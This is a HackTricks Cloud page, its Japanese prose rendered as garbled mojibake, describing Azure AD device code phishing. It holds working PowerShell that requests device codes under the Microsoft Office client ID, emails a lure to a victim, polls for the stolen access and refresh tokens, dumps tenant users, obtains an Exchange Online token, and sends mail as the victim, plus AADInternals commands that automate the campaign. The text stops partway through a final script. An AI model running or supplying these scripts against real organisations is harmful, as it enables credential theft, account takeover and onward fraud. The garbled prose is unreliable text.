# Az - ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰èªè¨¼ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ç‰ˆã®PEASSã‚„HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’æå‡ºã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®githubãƒªãƒã‚¸ãƒˆãƒªã«å‚åŠ ã—ã¦ãã ã•ã„ã€‚**

</details>

**ã“ã®æŠ•ç¨¿ã¯** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/) **ã‹ã‚‰ã‚³ãƒ”ãƒ¼ã•ã‚Œã¾ã—ãŸã€‚**

### ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰èªè¨¼ã¨ã¯ <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Microsoftã®[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)ã«ã‚ˆã‚‹ã¨ã€ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰èªè¨¼ã¯æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã•ã‚Œã¦ã„ã¾ã™ã€‚

> ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ã‚¹ãƒãƒ¼ãƒˆãƒ†ãƒ¬ãƒ“ã€IoTãƒ‡ãƒã‚¤ã‚¹ã€ãƒ—ãƒªãƒ³ã‚¿ãƒ¼ãªã©ã®å…¥åŠ›åˆ¶ç´„ã®ã‚ã‚‹ãƒ‡ãƒã‚¤ã‚¹ã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚ã“ã®ãƒ•ãƒ­ãƒ¼ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã€ãƒ‡ãƒã‚¤ã‚¹ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«åˆ¥ã®ãƒ‡ãƒã‚¤ã‚¹ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹ã‚ˆã†ã«ä¾é ¼ã—ã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹ã¨ã€ãƒ‡ãƒã‚¤ã‚¹ã¯å¿…è¦ã«å¿œã˜ã¦ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã¨ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ãƒ—ãƒ­ã‚»ã‚¹ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

1. ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ‡ãƒã‚¤ã‚¹ä¸Šã§ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ•ãƒ­ãƒ¼ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã‚¢ãƒ—ãƒªã‚’èµ·å‹•ã—ã¾ã™ã€‚
2. ã‚¢ãƒ—ãƒªã¯Azure ADã®/devicecodeã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«æ¥ç¶šã—ã€**client\_id**ã¨**resource**ã‚’é€ä¿¡ã—ã¾ã™ã€‚
3. Azure ADã¯**device\_code**ã€**user\_code**ã€ãŠã‚ˆã³**verification\_url**ã‚’è¿”ã—ã¾ã™ã€‚
4. ãƒ‡ãƒã‚¤ã‚¹ã¯**verification\_url** (hxxps://microsoft.com/devicelogin) ã¨**user\_code**ã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«è¡¨ç¤ºã—ã¾ã™ã€‚
5. ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ–ãƒ©ã‚¦ã‚¶ã‚’é–‹ãã€**verification\_url**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€è¦æ±‚ã•ã‚ŒãŸå ´åˆã«**user\_code**ã‚’å…¥åŠ›ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã¾ã™ã€‚
6. ãƒ‡ãƒã‚¤ã‚¹ã¯Azure ADã‚’ãƒãƒ¼ãƒªãƒ³ã‚°ã—ã€ãƒ­ã‚°ã‚¤ãƒ³ãŒæˆåŠŸã™ã‚‹ã¨**access\_token**ã¨**refresh\_token**ã‚’å–å¾—ã—ã¾ã™ã€‚

![ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ•ãƒ­ãƒ¼](https://o365blog.com/images/posts/phishing\_5.png)

### ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰èªè¨¼ã‚’åˆ©ç”¨ã—ãŸãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚° <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰èªè¨¼ã‚’ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã«åˆ©ç”¨ã™ã‚‹åŸºæœ¬çš„ãªã‚¢ã‚¤ãƒ‡ã‚¢ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

1. æ”»æ’ƒè€…ã¯/devicecodeã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«æ¥ç¶šã—ã€**client\_id**ã¨**resource**ã‚’é€ä¿¡ã—ã¾ã™ã€‚
2. **verification\_uri**ã¨**user\_code**ã‚’å—ã‘å–ã£ãŸå¾Œã€**verification\_uri**ã¨**user\_code**ã¸ã®ãƒªãƒ³ã‚¯ã‚’å«ã‚€ãƒ¡ãƒ¼ãƒ«ã‚’ä½œæˆã—ã€è¢«å®³è€…ã«é€ä¿¡ã—ã¾ã™ã€‚
3. è¢«å®³è€…ãŒãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€ã‚³ãƒ¼ãƒ‰ã‚’æä¾›ã—ã¦ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚’å®Œäº†ã—ã¾ã™ã€‚
4. æ”»æ’ƒè€…ã¯**access\_token**ã¨**refresh\_token**ã‚’å—ã‘å–ã‚Šã€è¢«å®³è€…ã‚’æ¨¡å€£ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### 1. /devicecodeã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¸ã®æ¥ç¶š <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€Azure ADã®devicecodeã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦HTTP POSTã‚’è¡Œã†ã“ã¨ã§ã™ï¼š
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
ç§ã¯ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ç§ã¯ã€ŒMicrosoft Officeã€ã®client\_idã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’é¸ã³ã¾ã—ãŸã€‚ã“ã‚Œã¯æœ€ã‚‚ä¿¡é ¼æ€§ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªåã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã—ã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚‚ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚é¸æŠã—ãŸãƒªã‚½ãƒ¼ã‚¹ã¯ã€MSOnline PowerShellãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ä½¿ç”¨ã•ã‚Œã‚‹AAD Graph APIã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚

| ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿  | å€¤                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼       | èª¬æ˜                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¦æ±‚ã•ã‚ŒãŸã¨ãã«å…¥åŠ›ã™ã‚‹ã‚³ãƒ¼ãƒ‰                                   |
| device\_code      | èªè¨¼çµæœã‚’ã€Œãƒãƒ¼ãƒªãƒ³ã‚°ã€ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰                    |
| verification\_url | ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒèªè¨¼ã®ãŸã‚ã«ãƒ–ãƒ©ã‚¦ã‚ºã™ã‚‹å¿…è¦ã®ã‚ã‚‹URL                         |
| expires\_in       | æœ‰åŠ¹æœŸé™ã®æ™‚é–“ï¼ˆ15åˆ†ï¼‰                                 |
| interval          | ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒèªè¨¼ã®ãŸã‚ã«ãƒãƒ¼ãƒªãƒ³ã‚°ã™ã‚‹é »åº¦ï¼ˆç§’å˜ä½ï¼‰ |
| message           | ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«è¡¨ç¤ºã™ã‚‹ãŸã‚ã®äº‹å‰ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸                            |

ä»¥ä¸‹ã¯deviceloginã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ï¼š
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**æ³¨æ„ï¼** ç§ã¯ãƒãƒ¼ã‚¸ãƒ§ãƒ³1.0ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹v2.0ãƒ•ãƒ­ãƒ¼ã¨ã¯å°‘ã—ç•°ãªã‚Šã¾ã™ã€‚

#### 2. ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã®ä½œæˆ <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

ä»Šã€ç§ãŸã¡ã¯**verification\_url**ï¼ˆå¸¸ã«åŒã˜ï¼‰ã¨**user\_code**ã‚’æŒã£ã¦ã„ã‚‹ã®ã§ã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã‚’ä½œæˆã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ³¨æ„ï¼** ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã™ã‚‹ã«ã¯ã€å‹•ä½œã™ã‚‹SMTPã‚µãƒ¼ãƒ“ã‚¹ãŒå¿…è¦ã§ã™ã€‚

ä»¥ä¸‹ã¯ã€è¢«å®³è€…ã«ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ï¼š
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
å—ã‘å–ã£ãŸãƒ¡ãƒ¼ãƒ«ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š![ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ•ãƒ­ãƒ¼](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. ã€Œé­šã‚’é‡£ã‚‹ã€- ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒèªè¨¼ã‚’å®Ÿè¡Œã™ã‚‹ <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€æ¬¡ã®ã‚µã‚¤ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚URLã¯æ­£è¦ã®Microsoftã®URLã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ¡ãƒ¼ãƒ«ã‹ã‚‰ã®ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã™ã‚‹ã‚ˆã†ã«æ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚

![ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰](https://o365blog.com/images/posts/phishing\_7.png)

ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ãŸå¾Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é¸æŠã™ã‚‹ã‚ˆã†ã«æ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**Microsoft Office**ã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹ã‚ˆã†ã«æ±‚ã‚ã‚‰ã‚Œã¾ã™ - åŒæ„ã¯æ±‚ã‚ã‚‰ã‚Œã¾ã›ã‚“ã€‚

**æ³¨æ„ï¼**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ãªã„å ´åˆã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆçµ„ç¹”ãŒä½¿ç”¨ã—ã¦ã„ã‚‹æ–¹æ³•ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

![ãƒ­ã‚°ã‚¤ãƒ³](https://o365blog.com/images/posts/phishing\_8.png)

èªè¨¼ãŒæˆåŠŸã—ãŸå¾Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¯æ¬¡ã®ã‚ˆã†ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

![åˆ©ç›Š](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **ã“ã®æ™‚ç‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èº«å…ƒãŒå±é™ºã«ã•ã‚‰ã•ã‚Œã¦ã„ã¾ã™ï¼** :warning:

#### 4. ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®å–å¾— <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

æ”»æ’ƒè€…ã®æœ€å¾Œã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ã“ã¨ã§ã™ã€‚ã‚¹ãƒ†ãƒƒãƒ—2ã‚’å®Œäº†ã—ãŸå¾Œã€æ”»æ’ƒè€…ã¯Azure ADã«å¯¾ã—ã¦èªè¨¼ã®çŠ¶æ…‹ã‚’ãƒãƒ¼ãƒªãƒ³ã‚°ã—å§‹ã‚ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€5ç§’ã”ã¨ã«Azure ADã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦HTTP POSTã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå¿…è¦ã§ã™ï¼ˆcodeã¯ã‚¹ãƒ†ãƒƒãƒ—1ã®device_codeã§ã™ï¼‰

| ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿   | å€¤                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

èªè¨¼ãŒä¿ç•™ä¸­ã®å ´åˆã€ä»¥ä¸‹ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã¨ã¨ã‚‚ã«httpã‚¨ãƒ©ãƒ¼**400 Bad Request**ãŒè¿”ã•ã‚Œã¾ã™ï¼š
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
ãƒ­ã‚°ã‚¤ãƒ³ã«æˆåŠŸã—ãŸå¾Œã€ä»¥ä¸‹ã®å¿œç­”ã‚’å—ã‘å–ã‚Šã¾ã™ï¼ˆãƒˆãƒ¼ã‚¯ãƒ³ã¯åˆ‡ã‚Šè©°ã‚ã‚‰ã‚Œã¾ã™ï¼‰ï¼š
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€Azure ADãƒˆãƒ¼ã‚¯ãƒ³ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«æ¥ç¶šã—ã€èªè¨¼ã®çŠ¶æ…‹ã‚’ãƒãƒ¼ãƒªãƒ³ã‚°ã—ã¾ã™ã€‚
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
ã„ã¾ã‚„ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦è¢«å®³è€…ã‚’ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚‚ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ\_idãŒåŒã˜ã§ã‚ã‚‹é™ã‚Šã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€Exchange Onlineã®ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã¾ã™ã€‚
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã«AADInternalsã‚’ä½¿ç”¨ã™ã‚‹ <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternalsï¼ˆv0.4.4ä»¥é™ï¼‰ã«ã¯ã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ—ãƒ­ã‚»ã‚¹ã‚’è‡ªå‹•åŒ–ã™ã‚‹[Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing)é–¢æ•°ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºå¯èƒ½ã§ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ¡ãƒ¼ãƒ«ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸:\
![ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«](https://o365blog.com/images/posts/phishing\_11.png)

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®Teamsã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸:\
![ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸](https://o365blog.com/images/posts/phishing\_12.png)

### ãƒ¡ãƒ¼ãƒ« <a href="#email" id="email"></a>

ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã—ã¾ã™ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
ãã—ã¦ã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€è¢«å®³è€…ã¨ã—ã¦ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
# Send email as the victim

